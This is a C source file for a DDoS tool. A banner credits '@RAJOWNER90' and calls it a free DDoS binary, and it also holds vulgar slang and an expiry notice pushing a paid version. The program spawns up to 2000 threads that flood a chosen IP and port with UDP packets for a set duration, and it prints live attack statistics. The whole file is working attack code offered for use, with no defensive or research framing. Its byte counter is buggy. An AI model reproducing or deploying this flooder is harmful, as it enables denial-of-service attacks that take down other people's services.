#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <unistd.h>
#include <time.h>
#include <signal.h>
#include <string.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define MAX_THREADS 2000
#define DEFAULT_PACKET_SIZE 20
#define DEFAULT_THREAD_COUNT 1000
#define EXPIRATION_YEAR 2025
#define EXPIRATION_MONTH 04
#define EXPIRATION_DAY 15

int keep_running = 1;
char *global_payload;

typedef struct {
    int socket_fd;
    char *target_ip;
    int target_port;
    int duration;
    int packet_size;
    int thread_id;
} attack_params;

typedef struct {
    unsigned long pps;
    double gb_sent;
    double mbps;
    unsigned long max_pps;
} stats;

stats current_stats = {0};

void print_banner() {
    // Calculate remaining time (you'll need to implement this)
    time_t now = time(NULL);
    struct tm expiry_tm = {0};
    expiry_tm.tm_year = EXPIRATION_YEAR - 1900;
    expiry_tm.tm_mon = EXPIRATION_MONTH - 1;
    expiry_tm.tm_mday = EXPIRATION_DAY;
    time_t expiry_time = mktime(&expiry_tm);
    double diff = difftime(expiry_time, now);
    
    int remaining_days = (int)(diff / (60*60*24));
    int remaining_hours = (int)(diff / (60*60)) % 24;
    int remaining_minutes = (int)(diff / 60) % 60;
    int remaining_seconds_int = (int)diff % 60;

    printf("\n");
    printf("\033[1;36m╔═══════════════════════════════════════════════════════════════════╗\033[0m\n");
    printf("\033[1;36m║ \033[1;32m██████╗  █████╗ ██████╗      ██╗  ██╗ ██████╗ ███╗   ██╗ ██████╗ ║\033[0m\n");
    printf("\033[1;36m║ \033[1;32m██╔══██╗██╔══██╗╚════██╗    ██║  ██║██╔═══██╗████╗  ██║██╔══██╗║\033[0m\n");
    printf("\033[1;36m║ \033[1;32m██████╔╝███████║ █████╔╝    ███████║██║   ██║██╔██╗ ██║██████╔╝║\033[0m\n");
    printf("\033[1;36m║ \033[1;32m██╔══██╗██╔══██║██╔═══╝     ██╔══██║██║   ██║██║╚██╗██║██╔══██╗║\033[0m\n");
    printf("\033[1;36m║ \033[1;32m██║  ██║██║  ██║███████╗    ██║  ██║╚██████╔╝██║ ╚████║██║  ██║║\033[0m\n");
    printf("\033[1;36m╠═══════════════════════════════════════════════════════════════════╣\033[0m\n");
    printf("\033[1;36m║ \033[1;33m✦ DEVELOPED BY: \033[1;32m@RAJOWNER90                            \033[1;36m║\033[0m\n");
    printf("\033[1;36m║ \033[1;33m✦ EXPIRY TIME: \033[1;32m%d days, %02d:%02d:%02d \033[1;36m║\033[0m\n", 
           remaining_days, remaining_hours, remaining_minutes, remaining_seconds_int);
    printf("\033[1;36m║ \033[1;33m✦ AAGYA TERA BAAP BY: \033[1;32mRAJOWNER                          \033[1;36m║\033[0m\n");
    printf("\033[1;36m║ \033[1;33m✦ YE FULL FREE DDOS BANARY HAI                                    \033[1;36m║\033[0m\n");
    printf("\033[1;36m║ \033[1;31m✦ ! [ SELL KRNE WALO BAHEN CHUDALO ] \033[1;36m║\033[0m\n");
    printf("\033[1;36m║ \033[1;33m✦ YE FILE EXPIRY KE BAAD NEW FILE PAID MILEGA \033[1;36m║\033[0m\n");
    printf("\033[1;36m║ \033[1;33m✦ CONTACT: \033[1;32m@RAJOWNER90                          \033[1;36m║\033[0m\n");
    printf("\033[1;36m╠═══════════════════════════════════════════════════════════════════╣\033[0m\n");
    printf("\033[1;36m║ \033[1;32m██████╗  █████╗ ██████╗      ██╗  ██╗ ██████╗ ███╗   ██╗ ██████╗ ║\033[0m\n");
    printf("\033[1;36m║ \033[1;32m██╔══██╗██╔══██╗╚════██╗    ██║  ██║██╔═══██╗████╗  ██║██╔══██╗║\033[0m\n");
    printf("\033[1;36m║ \033[1;32m██████╔╝███████║ █████╔╝    ███████║██║   ██║██╔██╗ ██║██████╔╝║\033[0m\n");
    printf("\033[1;36m║ \033[1;32m██╔══██╗██╔══██║██╔═══╝     ██╔══██║██║   ██║██║╚██╗██║██╔══██╗║\033[0m\n");
    printf("\033[1;36m║ \033[1;32m██║  ██║██║  ██║███████╗    ██║  ██║╚██████╔╝██║ ╚████║██║  ██║║\033[0m\n");
    printf("\033[1;36m╠═══════════════════════════════════════════════════════════════════╣\033[0m\n");
    printf("\033[1;36m║ \033[1;32mP O W E R F U L \033[1;36m★ \033[1;32mR A J O W N E R \033[1;36m║\033[0m\n");
    printf("\033[1;36m╚═══════════════════════════════════════════════════════════════════╝\033[0m\n\n");
}
void handle_signal(int sig) {
    keep_running = 0;
    printf("\nSignal received, stopping attack...\n");
}

void *udp_flood(void *args) {
    attack_params *params = (attack_params *)args;
    struct sockaddr_in target;
    char buffer[params->packet_size];
    memset(buffer, 0, params->packet_size);

    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(params->target_port);
    inet_pton(AF_INET, params->target_ip, &target.sin_addr);

    while (keep_running) {
        if (sendto(params->socket_fd, buffer, params->packet_size, 0, 
                  (struct sockaddr *)&target, sizeof(target)) > 0) {
            __sync_fetch_and_add(&current_stats.pps, 1);
            __sync_fetch_and_add((long *)&current_stats.gb_sent, (long)(params->packet_size / (1024 * 1024 * 1024)));
        }
    }
    close(params->socket_fd);
    return NULL;
}

void *stats_thread(void *args) {
    time_t start_time = time(NULL);
    unsigned long last_pps = 0;
    time_t last_time = start_time;
    
    while (keep_running) {
        time_t now = time(NULL);
        double elapsed = difftime(now, start_time);
        unsigned long current = current_stats.pps;
        
        if (now > last_time) {
            current_stats.mbps = (current - last_pps) * 1024 * 8 / 1000000.0;
            last_pps = current;
            last_time = now;
        }
        
        if (current > current_stats.max_pps) {
            current_stats.max_pps = current;
        }
        
        printf("\r\033[34m[RAJ-ATTACK] Time: %.0fs | PPS: %lu (%.1fK/s) | Data: %.2fGB | Speed: %.2fMbps | Peak: %lupps\033[0m",
               elapsed, current, (current / elapsed)/1000, 
               current_stats.gb_sent, current_stats.mbps, current_stats.max_pps);
        fflush(stdout);
        usleep(200000);
    }
    return NULL;
}

int main(int argc, char *argv[]) {
    print_banner();

    time_t now = time(NULL);
    struct tm *tm = localtime(&now);
    if (tm->tm_year + 1900 > EXPIRATION_YEAR ||
        (tm->tm_year + 1900 == EXPIRATION_YEAR && tm->tm_mon + 1 > EXPIRATION_MONTH) ||
        (tm->tm_year + 1900 == EXPIRATION_YEAR && tm->tm_mon + 1 == EXPIRATION_MONTH && tm->tm_mday > EXPIRATION_DAY)) {
        printf("\n\033[1;31m✖ Tool expired. Contact RAJOWNER for new version.\033[0m\n");
        return EXIT_FAILURE;
    }

    if (argc < 3) {
        printf("\n\033[1;33mUsage: %s <IP> <PORT> [DURATION=60] [PACKET_SIZE=%d] [THREADS=%d]\033[0m\n", 
               argv[0], DEFAULT_PACKET_SIZE, DEFAULT_THREAD_COUNT);
        return EXIT_FAILURE;
    }

    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int duration = (argc > 3) ? atoi(argv[3]) : 60;
    int packet_size = (argc > 4) ? atoi(argv[4]) : DEFAULT_PACKET_SIZE;
    int thread_count = (argc > 5) ? atoi(argv[5]) : DEFAULT_THREAD_COUNT;

    if (thread_count > MAX_THREADS) {
        thread_count = MAX_THREADS;
        printf("\n\033[1;33m⚠ Thread count reduced to maximum %d\033[0m\n", MAX_THREADS);
    }

    global_payload = malloc(packet_size);
    if (!global_payload) {
        perror("Memory allocation failed");
        return EXIT_FAILURE;
    }
    memset(global_payload, rand() % 256, packet_size);

    signal(SIGINT, handle_signal);

    pthread_t threads[MAX_THREADS];
    attack_params params[MAX_THREADS];
    pthread_t stats_tid;

    printf("\n\033[1;36m[+] Starting RAJ-ATTACK on %s:%d for %d seconds with %d threads\033[0m\n",
           target_ip, target_port, duration, thread_count);

    pthread_create(&stats_tid, NULL, stats_thread, NULL);

    for (int i = 0; i < thread_count; i++) {
        params[i] = (attack_params){
            .target_ip = target_ip,
            .target_port = target_port,
            .duration = duration,
            .packet_size = packet_size,
            .thread_id = i,
            .socket_fd = socket(AF_INET, SOCK_DGRAM, 0)
        };

        if (params[i].socket_fd < 0) {
            perror("Socket creation failed");
            return EXIT_FAILURE;
        }

        pthread_create(&threads[i], NULL, udp_flood, &params[i]);
    }

    time_t start_time = time(NULL);
    while (keep_running && difftime(time(NULL), start_time) < duration) {
        usleep(100000);
    }

    keep_running = 0;
    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }
    pthread_join(stats_tid, NULL);

    free(global_payload);
    printf("\n\n\033[1;32m[✓] Attack completed by RAJOWNER. Total packets sent: %lu (%.2fGB)\033[0m\n",
           current_stats.pps, current_stats.gb_sent);
    
    return EXIT_SUCCESS;
}